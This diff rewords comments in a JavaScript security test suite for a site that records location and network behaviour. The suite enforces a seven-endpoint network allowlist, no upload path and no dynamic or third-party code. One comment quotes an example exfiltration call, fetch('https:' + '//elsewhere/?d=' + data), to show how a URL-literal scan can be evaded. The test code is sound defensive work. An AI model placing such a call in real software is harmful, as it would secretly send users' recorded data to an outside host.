@@ -1,6 +1,6 @@
-// Security tests. The site records a person's location and network behaviour, so the
-// properties enforced here are: it contacts nothing but its seven probes, it has no way to
-// upload what it records, it executes no dynamic code, and it ships no third-party code.
+// Security tests. The site records location and network behaviour, so these properties are
+// enforced: network access limited to seven probe endpoints, no upload path, no dynamic code
+// execution, no third-party code.
 import assert from 'node:assert';
 import {readFileSync, readdirSync} from 'node:fs';
 import {execFileSync} from 'node:child_process';
@@ -46,9 +46,8 @@ s.test('the source files MUST contain no outbound origin outside ALLOWED_ORIGINS
   assert.ok(found.size > 0, 'the allowlist check inspected something');
 });
 
-// A scan for forbidden URL literals passes `fetch('https:' + '//elsewhere/?d=' + data)` and
-// protocol-relative `//elsewhere`. Enumerating the call sites is exhaustive instead: the
-// application reaches the network from one expression.
+// A URL-literal scan misses `fetch('https:' + '//elsewhere/?d=' + data)` and protocol-relative
+// `//elsewhere`; enumerating call sites covers both, and the application has one.
 s.test('js/ MUST contain one fetch call, taking a URL built by probeUrl WHEN the call sites are enumerated', () => {
   const calls = [];
   for (const [file, src] of sources) {
@@ -200,7 +199,7 @@ s.test('sw.js MUST precache every js file, index.html, app.css and the manifest,
   for (const f of ['index.html', 'app.css', 'manifest.webmanifest']) {
     assert.ok(shell.includes(f), `${f} is not precached`);
   }
-  // A listed file that does not exist fails the install and caches nothing.
+  // A listed file that does not exist fails the install and leaves the cache empty.
   const {existsSync} = require('node:fs');
   for (const f of shell) {
     assert.ok(existsSync(new URL(`../${f}`, import.meta.url)), `${f} is precached but missing`);
@@ -230,7 +229,7 @@ s.test('.dev MUST be untracked and ignored as a whole directory WHEN git ls-file
   const leaked = tracked.filter(f => f.startsWith('.dev/'));
   assert.deepEqual(leaked, [], `local-only files are tracked: ${leaked.join(', ')}`);
 
-  // The rule covers the directory, so renaming an export inside it changes nothing.
+  // The rule covers the directory, so renamed exports inside it stay ignored.
   const rules = readFileSync(new URL('../.gitignore', import.meta.url), 'utf8')
     .split('\n').map(l => l.trim());
   assert.ok(rules.includes('.dev/'), '.gitignore ignores the directory as a whole');
